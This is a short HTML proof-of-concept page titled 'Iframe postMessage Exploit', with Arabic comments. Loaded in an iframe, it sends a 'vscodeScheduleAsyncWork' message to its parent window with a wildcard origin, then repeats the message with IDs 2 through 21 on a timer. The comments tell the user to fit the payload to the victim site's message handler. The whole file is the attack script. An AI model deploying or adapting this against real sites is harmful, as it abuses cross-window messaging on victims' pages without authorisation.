<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8" />
    <title>Iframe postMessage Exploit</title>
  </head>
  <body>
    <h1>Loading attack payload...</h1>

    <script>
      // تحضير رسالة postMessage
      const payload = {
        // خصص المفتاح الذي يستقبله الموقع الضحية (حسب ما وجدته)
        vscodeScheduleAsyncWork: 1, // نجرب ID=1 كبداية
        // إذا كان هناك خصائص أخرى مطلوبة، أضفها هنا
      };

      // إرسال الرسالة إلى النافذة الأم
      console.log("Sending payload to parent...");
      parent.postMessage(payload, "*"); // أو حدد origin بدلاً من "*"

      // إعادة المحاولة مع IDات مختلفة
      let id = 2;
      const interval = setInterval(() => {
        if (id > 20) clearInterval(interval);
        parent.postMessage({ vscodeScheduleAsyncWork: id }, "*");
        console.log("Trying ID: ", id);
        id++;
      }, 500);
    </script>
  </body>
</html>
